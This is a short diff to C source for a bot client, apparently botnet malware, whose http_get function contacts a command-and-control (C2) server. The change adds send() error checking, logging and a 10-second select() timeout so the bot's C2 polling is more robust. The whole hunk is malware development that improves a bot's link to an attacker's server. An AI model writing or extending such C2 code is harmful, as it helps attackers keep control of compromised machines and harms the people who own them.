@@ -443,11 +443,25 @@ int http_get(notnet_bot_t *bot, char *buf, int len) {
         "\r\n",
         bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent);
     
-    send(bot->c2_http.sock, req, strlen(req), 0);
+    int sent = send(bot->c2_http.sock, req, strlen(req), 0);
+    if (sent < 0) {
+        log_warn("HTTP: GET send failed: %s", strerror(errno));
+        return -1;
+    }
     
-    /* Read response */
+    /* Read response with 10s timeout to prevent indefinite blocking */
     int total = 0;
     while (total < len - 1) {
+        fd_set read_fds;
+        struct timeval tv;
+        FD_ZERO(&read_fds);
+        FD_SET(bot->c2_http.sock, &read_fds);
+        tv.tv_sec = 10;
+        tv.tv_usec = 0;
+
+        int sel = select(bot->c2_http.sock + 1, &read_fds, NULL, NULL, &tv);
+        if (sel <= 0) break;  /* timeout or error */
+
         int received = recv(bot->c2_http.sock, buf + total, len - total - 1, 0);
         if (received <= 0) break;
         total += received;
